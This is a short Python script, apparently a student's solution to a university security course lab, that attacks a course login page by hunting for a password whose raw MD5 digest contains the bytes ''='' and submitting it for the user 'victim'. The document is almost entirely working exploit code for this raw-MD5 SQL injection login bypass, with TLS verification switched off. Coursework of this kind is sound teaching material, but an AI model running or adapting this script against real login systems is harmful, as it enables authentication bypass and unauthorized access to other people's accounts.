#sql_2 python file import_requests.py
import requests
import hashlib
import random,re
# define the webpage you want to crack
url = "https://comp427.rice.edu/proj2/sqlinject2/checklogin.php"
# victim is the username we need to use
username = 'victim'
while(True):
#maximum positive value for a 32-bit
    max_val = (2**32)//2 - 1
#poss_pw=possible password
    poss_pw = ""
#loop to reach the 32 digit length hash
    for i in range(0,3):
        poss_pw = poss_pw + str(random.randint(0, max_val))
    encoded_poss_pw = poss_pw.encode('utf-8')
    #compare to see if there is a match
    compare = re.search(br"'='", hashlib.md5(encoded_poss_pw).digest())
    if compare:
        break
#set the password to poss_pw
password = poss_pw
data = {'username':username, 'password':poss_pw}
#sending the data to the url to automatically test the username and password
send_data_url = requests.post(url, data=data, verify=False)
print(send_data_url.content) #will show whether the login passed and the inline comment
if "Login successful!" in str(send_data_url.content):
    print("[*] Password found:%s"%poss_pw)

else:
    print("[*] Attempting password: %s"%poss_pw)
